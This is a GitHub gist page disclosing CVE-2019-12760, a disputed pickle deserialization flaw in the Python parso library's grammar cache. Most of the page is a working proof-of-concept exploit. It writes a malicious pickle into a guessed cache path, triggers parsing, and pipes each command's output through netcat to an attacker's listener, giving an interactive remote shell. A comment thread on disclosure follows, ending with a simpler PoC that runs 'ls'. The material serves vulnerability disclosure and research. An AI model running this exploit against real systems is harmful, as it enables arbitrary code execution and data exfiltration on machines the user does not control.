
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dhondta](https://avatars.githubusercontent.com/u/9108102?s=64&v=4)](/dhondta)

# [dhondta](/dhondta)/**[README.md](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7)**

Last active
February 16, 2022 08:13

Show Gist options

* [Download ZIP](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/archive/88e97ed20dcc6962be7fdffae5f9824f15d29772.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7)You must be signed in to star a gist
* [Fork
  (2)
  2](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7.js&quot;&gt;&lt;/script&gt;
* Save dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7 to your computer and use it in GitHub Desktop.

[Code](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7)
[Revisions
7](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/revisions)
[Stars
1](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/stargazers)
[Forks
2](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7.js&quot;&gt;&lt;/script&gt;

Save dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7 to your computer and use it in GitHub Desktop.

[Download ZIP](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/archive/88e97ed20dcc6962be7fdffae5f9824f15d29772.zip)

Proof-of-Concept for Python parso Cache Load Vulnerability (CVE-2019-12760)

 [Raw](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/raw/88e97ed20dcc6962be7fdffae5f9824f15d29772/README.md)

[**README.md**](#file-readme-md)

### [CVE-2019-12760](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12760)

### Description

\*\* DISPUTED \*\* A deserialization vulnerability exists in the way parso through 0.4.0 handles grammar parsing from the cache. Cache loading relies on pickle and, provided that an evil pickle can be written to a cache grammar file and that its parsing can be triggered, this flaw leads to Arbitrary Code Execution. NOTE: This is disputed because "the cache directory is not under control of the attacker in any common configuration."

### References

* [davidhalter/parso#75](https://github.com/davidhalter/parso/issues/75)

 [Raw](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7/raw/88e97ed20dcc6962be7fdffae5f9824f15d29772/poc-python-parso.py)

[**poc-python-parso.py**](#file-poc-python-parso-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #!/usr/bin/python |
| --- | --- |
|  | import parso |
|  | import pickle |
|  | import random |
|  | import shutil |
|  | import threading |
|  | from hashlib import sha256 |
|  | from os import makedirs, remove, system |
|  | from os.path import dirname, exists, join |
|  | from six import b, u |
|  | from subprocess import Popen, PIPE |
|  | from sys import version\_info as v |
|  | from tinyscript import \* |
|  |  |
|  |  |
|  | \_\_author\_\_ = "Alexandre D'Hondt" |
|  | \_\_version\_\_ = "1.0" |
|  | \_\_copyright\_\_ = "AGPLv3 (http://www.gnu.org/licenses/agpl.html)" |
|  | \_\_doc\_\_ = """ |
|  | This Proof-of-Concept exploit leverages cache loading of the parso library. |
|  | It requires the attacker to be able to create a folder and to write files on |
|  | the target. It guesses the path to a cache file, writes an evil pickled object |
|  | to it and, while triggering grammar loading, makes the vulnerable application |
|  | load the evil pickle to allow Arbitrary Code Execution. |
|  | """ |
|  |  |
|  |  |
|  | # ------------------------- FUNCTIONS TO BE CUSTOMIZED ------------------------- |
|  | def get\_payload(command, lhost, lport): |
|  | # TODO: implement here the logic to send remote command result to attacker's |
|  | # host (i.e. if Netcat is not present on the remote server) |
|  | class PoC(object): |
|  | def \_\_reduce\_\_(self): |
|  | return (system, ("{} | nc -n {} {} -w 1" |
|  | .format(command, lhost, lport), )) |
|  | return pickle.dumps(PoC()) |
|  |  |
|  |  |
|  | def remove\_from\_target(host, port, abspath): |
|  | # TODO: implement here the logic to remove a file from the remote server |
|  | remove(abspath) |
|  |  |
|  |  |
|  | def trigger\_grammar\_processing(dummy\_path, cache\_path): |
|  | # TODO: implement here the logic to trigger grammar processing by parso on |
|  | # the remote server |
|  | g = parso.load\_grammar() |
|  | try: |
|  | g.parse(path=dummy\_path, cache=True, cache\_path=cache\_path) |
|  | except: |
|  | pass |
|  |  |
|  |  |
|  | def write\_to\_target(host, port, abspath, content=""): |
|  | # TODO: implement here the logic to write a file to the remote server |
|  | d = dirname(abspath) |
|  | if not exists(d): |
|  | makedirs(d) |
|  | with open(abspath, 'wb') as f: |
|  | f.write(b(content)) |
|  | logger.debug("> File written to '%s'" % abspath) |
|  |  |
|  |  |
|  | # ----------------------------- STATIC FUNCTIONS ------------------------------- |
|  | class Listener(object): |
|  | def \_\_init\_\_(self): |
|  | self.state = 1 |
|  | self.thread = threading.Thread(target=self.run) |
|  | self.kwargs = {'stdout': PIPE, 'stderr': PIPE, 'shell': True} |
|  |  |
|  | def run(self): |
|  | global args |
|  | last\_lport = args.lport = 0 |
|  | while True: |
|  | if self.state == 0: |
|  | break |
|  | while args.lport == last\_lport: |
|  | args.lport = random.randint(12345, 45678) |
|  | logger.debug("Starting new listener on port {}".format(args.lport)) |
|  | self.args = ("nc -nlvp {}".format(args.lport), ) |
|  | out, \_ = Popen(\*self.args, \*\*self.kwargs).communicate() |
|  | try: |
|  | print(out.decode('utf-8')) |
|  | except: |
|  | print(u(str(out))) |
|  | last\_lport = args.lport |
|  |  |
|  |  |
|  | def cache\_filepath(cache\_path, python\_implem, dummy\_path, version): |
|  | # we take the hash from the grammar on the local host, thus assuming it is |
|  | # the same as target's one given Python's version |
|  | \_ = dirname(parso.\_\_file\_\_) |
|  | \_ = join(\_, "python", "grammar%s.txt" % version) |
|  | h = sha256(open(\_).read().encode("utf-8")).hexdigest() |
|  | p = sha256(dummy\_path.encode("utf-8")).hexdigest() |
|  | \_ = "%s/%s-%s-%i/%s-%s.pkl" % (cache\_path, python\_implem, version, |
|  | parso.cache.\_PICKLE\_VERSION, h, p) |
|  | logger.debug("> Cache path: %s" % \_) |
|  | return \_ |
|  |  |
|  |  |
|  | def start\_shell(): |
|  | global args |
|  | logger.debug("Starting shell...") |
|  | h, p, l = args.rhost, args.rport, args.lhost |
|  | i, v, r = args.implem, args.python, args.rdir |
|  | listener = Listener() |
|  | listener.thread.start() |
|  | cnt = 0 |
|  | while True: |
|  | d = join(r, "dummy{}".format(cnt)) |
|  | write\_to\_target(h, p, d) |
|  | cpath = cache\_filepath(r, i, d, v) |
|  | try: |
|  | cmd = raw\_input("> ") |
|  | except: |
|  | cmd = input("> ") |
|  | cmd = cmd.strip() |
|  | if cmd == "": |
|  | continue |
|  | elif cmd in ["exit", "quit"]: |
|  | listener.state = 0 |
|  | logger.debug("Killing Netcat instances...") |
|  | Popen("killall -9 nc", shell=True) |
|  | logger.debug("Joining Netcat thread...") |
|  | listener.thread.join(1) |
|  | logger.debug("Removing artifacts...") |
|  | shutil.rmtree(args.rdir) |
|  | return |
|  | write\_to\_target(h, p, cpath, get\_payload(cmd, l, args.lport)) |
|  | trigger\_grammar\_processing(d, r) |
|  | remove\_from\_target(h, p, cpath) |
|  | remove\_from\_target(h, p, d) |
|  | cnt += 1 |
|  |  |
|  |  |
|  | # -------------------------- SCRIPT'S EXECUTABLE PART -------------------------- |
|  | if \_\_name\_\_ == '\_\_main\_\_': |
|  | global args |
|  | target = parser.add\_argument\_group("Target options") |
|  | target.add\_argument("-d", "--cache-dir", dest="rdir", default="/tmp/parso", |
|  | help="cache absolute folder") |
|  | target.add\_argument("-i", "--implem", default="CPython", |
|  | choices=["CPython", "IronPython", "Jython", "PyPy"], |
|  | help="platform Python's implementation") |
|  | target.add\_argument("--rhost", default="127.0.0.1", |
|  | help="local host address") |
|  | target.add\_argument("--rport", default=80, type=int, |
|  | help="local host port") |
|  | target.add\_argument("-p", "--python", default="36", |
|  | help="Python major and minor version digits") |
|  | payload = parser.add\_argument\_group("Payload options") |
|  | payload.add\_argument("--lhost", default="127.0.0.1", |
|  | help="local host address") |
|  | initialize() |
|  | start\_shell() |

[![@iamleot](https://avatars.githubusercontent.com/u/6260382?s=80&v=4)](/iamleot)

Copy link

### **[iamleot](/iamleot)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937559#gistcomment-2937559)

Hello!

Have you shared that with upstream, if not can you please share it?

Thank you!

Sorry, something went wrong.

[![@dhondta](https://avatars.githubusercontent.com/u/9108102?s=80&v=4)](/dhondta)

Copy link

Author

### **[dhondta](/dhondta)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937634#gistcomment-2937634)

Of course I did, nearly 6 months ago...

Sorry, something went wrong.

[![@iamleot](https://avatars.githubusercontent.com/u/6260382?s=80&v=4)](/iamleot)

Copy link

### **[iamleot](/iamleot)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937643#gistcomment-2937643) via email

Alex writes:
 Of course I did, nearly 6 months ago...
Have you received any reply or updates from them?

Sorry, something went wrong.

[![@dhondta](https://avatars.githubusercontent.com/u/9108102?s=80&v=4)](/dhondta)

Copy link

Author

### **[dhondta](/dhondta)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937692#gistcomment-2937692)

Yes, I did. The developer told me he would fix it within a few weeks.

NB: I think this would be very unlikely to be exploited in the wild, but yet it should be fixed.

Sorry, something went wrong.

[![@iamleot](https://avatars.githubusercontent.com/u/6260382?s=80&v=4)](/iamleot)

Copy link

### **[iamleot](/iamleot)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937702#gistcomment-2937702) via email

Alex writes:
 Yes, I did. The developer told me he would fix it within a few weeks.
NB: I think this would be very unlikely to be exploited in the wild, but yet it should be fixed.
Have you then recontacted him before CVE-2019-12760 was published?
In any case I think it would be better to fill a public issue upstream
now that the problem is public. Can you please fill it?
Thank you!

Sorry, something went wrong.

[![@dhondta](https://avatars.githubusercontent.com/u/9108102?s=80&v=4)](/dhondta)

Copy link

Author

### **[dhondta](/dhondta)** commented [Jun 7, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2937729#gistcomment-2937729) • edited Loading

> Have you then recontacted him before CVE-2019-12760 was published?

Not yet, as I'm busy with other matters. I published this as a Gist for the records, also because it's kind of timed out regarding reponsible disclosure and for what it's worth.

> In any case I think it would be better to fill a public issue upstream now that the problem is public. Can you please fill it?

You're right, I will open an issue on the related GitHub repo soon.

Sorry, something went wrong.

[![@iamleot](https://avatars.githubusercontent.com/u/6260382?s=80&v=4)](/iamleot)

Copy link

### **[iamleot](/iamleot)** commented [Jun 15, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2944604#gistcomment-2944604)

JFTR this was reported upstream via [davidhalter/parso#75](https://github.com/davidhalter/parso/issues/75).

Thank you!

Sorry, something went wrong.

[![@dhondta](https://avatars.githubusercontent.com/u/9108102?s=80&v=4)](/dhondta)

Copy link

Author

### **[dhondta](/dhondta)** commented [Jun 18, 2019](/dhondta/f71ae7e5c4234f8edfd2f12503a5dcc7?permalink_comment_id=2946919#gistcomment-2946919)

Simpler proof-of-concept script:

```
#!/usr/bin/python
import parso
import pickle
import sys
from hashlib import sha256
from os import makedirs, system
from os.path import dirname, exists, join
from six import b

__author__ = "Alexandre D'Hondt"

print("\n1. Writing a dummy empty file...")
dummy = "/tmp/dummy"
with open(dummy, 'wb') as f:
    f.write(b(""))
print("   > %s" % dummy)
print("\n2. Computing cache file's path...")
pyversion = "".join(sys.version.split(".")[:2])
grammar = join(dirname(parso.__file__), "python", "grammar%s.txt" % pyversion)
cache = "/tmp/parso/CPython-%s-%i/%s-%s.pkl" % (
    pyversion,
    parso.cache._PICKLE_VERSION,
    sha256(open(grammar).read().encode("utf-8")).hexdigest(),
    sha256(dummy.encode("utf-8")).hexdigest()
)
print("   > %s" % cache)
d = dirname(cache)
if not exists(d):
    makedirs(d)
print("\n3. Writing a evil cache file (with a pickle payload)...")
class PoC(object):
    def __reduce__(self):
        return (system, ("ls", ))
with open(cache, 'wb') as f:
    f.write(pickle.dumps(PoC()))
print("   > done")
print("\n4. Triggering grammar parsing...")
g = parso.load_grammar()
try:
    print("\nCommand's result:\n")
    g.parse(path=dummy, cache=True, cache_path="/tmp/parso")
except Exception as e:
    pass
```

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdhondta%2Ff71ae7e5c4234f8edfd2f12503a5dcc7)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

